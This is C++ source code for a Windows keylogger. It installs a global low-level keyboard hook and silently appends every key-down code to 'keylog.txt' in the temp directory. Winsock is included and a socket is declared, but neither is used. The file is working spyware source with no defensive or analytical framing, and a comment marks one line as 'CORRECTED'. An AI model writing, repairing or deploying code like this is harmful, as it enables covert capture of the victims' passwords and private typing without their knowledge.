#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <string>
using namespace std;

#pragma comment(lib, "ws2_32.lib")

// Forward declarations
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
string getTempPath();
string createPath(const string& temp_path);

// Global variables
WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
HHOOK keyboardHook = NULL;

int main() {
    // Install the keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    if (keyboardHook == NULL) {
        
        return 1;
    }
    
    
    // Message loop
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    
    // Cleanup
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            
            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
            DWORD key_code = kb->vkCode;
            
            
            string temp = getTempPath();
            string filepath = createPath(temp);
            
           
            FILE* file = fopen(filepath.c_str(), "a");
            if (file != NULL) {
               
                fprintf(file, "%d ", key_code);
                fclose(file);
            }
        }
    }
    
    // CORRECTED: Pass the actual hook handle
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

string getTempPath() {
    char temp_path[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_path);
    return string(temp_path);
}

string createPath(const string& temp_path) {
    
    string FinalFile = temp_path + "keylog.txt";
    return FinalFile;
}

